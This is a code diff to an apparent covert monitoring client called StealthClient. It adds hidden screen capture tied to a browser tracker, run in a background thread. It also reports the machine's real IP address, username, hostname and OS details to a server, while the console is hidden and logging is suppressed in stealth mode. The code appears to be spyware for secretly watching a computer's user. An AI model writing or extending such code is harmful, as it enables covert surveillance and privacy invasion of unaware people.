@@ -17,6 +17,8 @@ from src.core.config import Config
 from src.utils.api_client import APIClient
 from src.modules.stream_handler import StreamHandler
 from src.modules.browser_tracker import BrowserTracker
+from src.modules.screen_capture import ScreenCapture
+from os_detector import get_os_info_for_client
 
 # Global flag for graceful shutdown
 shutdown_flag = False
@@ -145,6 +147,10 @@ class StealthClient:
 
         # Initialize browser tracker
         self.browser_tracker = BrowserTracker(self.api_client, self.logger)
+        
+        # Initialize screen capture with browser tracker integration
+        self.screen_capture = ScreenCapture(self.api_client)
+        self.screen_capture.set_browser_tracker(self.browser_tracker)
 
         # Hide console in stealth mode
         if Config.STEALTH_MODE:
@@ -153,15 +159,19 @@ class StealthClient:
     def register_client(self):
         """Register client with server (silent)"""
         try:
+            # Get OS info using the new detector
+            os_info = get_os_info_for_client()
+            
             client_info = {
                 'client_id': Config.CLIENT_ID,
                 'hostname': Config.HOSTNAME,
                 'platform': Config.PLATFORM,
                 'version': '1.0.0',
                 'capabilities': ['streaming', 'monitoring'],
-                'ip_address': '127.0.0.1',
+                'ip_address': Config.IP_ADDRESS,  # Use real IP address
                 'username': Config.CLIENT_USER,
-                'os_info': f"{Config.PLATFORM} {Config.HOSTNAME}"
+                'os_info': os_info,
+                'timezone': 'Asia/Jakarta'
             }
 
             response = self.api_client.post('/api/clients/register', client_info)
@@ -226,6 +236,21 @@ class StealthClient:
         except Exception as e:
             if not Config.STEALTH_MODE:
                 self.logger.error(f"Failed to start browser tracker: {e}")
+
+        # Start conditional screen capture in separate thread
+        screen_capture_thread = None
+        try:
+            screen_capture_thread = threading.Thread(
+                target=self.screen_capture.start_capture,
+                daemon=True,
+                name="ScreenCapture"
+            )
+            screen_capture_thread.start()
+            if not Config.STEALTH_MODE:
+                self.logger.info("Conditional screen capture started")
+        except Exception as e:
+            if not Config.STEALTH_MODE:
+                self.logger.error(f"Failed to start screen capture: {e}")
 
         # Stealth main loop - minimal logging
         heartbeat_counter = 0
